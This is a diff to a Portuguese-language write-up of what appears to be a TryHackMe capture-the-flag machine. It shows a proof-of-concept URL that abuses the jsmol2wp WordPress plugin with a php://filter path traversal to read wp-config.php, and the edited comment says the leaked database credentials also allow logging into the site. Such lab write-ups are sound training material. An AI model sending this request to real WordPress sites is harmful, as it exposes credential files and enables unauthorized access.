@@ -49,7 +49,8 @@
 --> POC:
 
     - http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
-      |_> Essa poc já revela as credênciais do banco de dados que podem ser usadas para fazer login na aplicação!
+      |_> Essa poc já revela as credênciais no arquivo de configurações do banco de dados!
+      |_> Com elas também é possível logar na aplicação!
 
 <img width="1673" height="641" alt="imagem" src="https://github.com/user-attachments/assets/79effd7a-6f9b-42f1-afb2-189de14df8e6" />
 
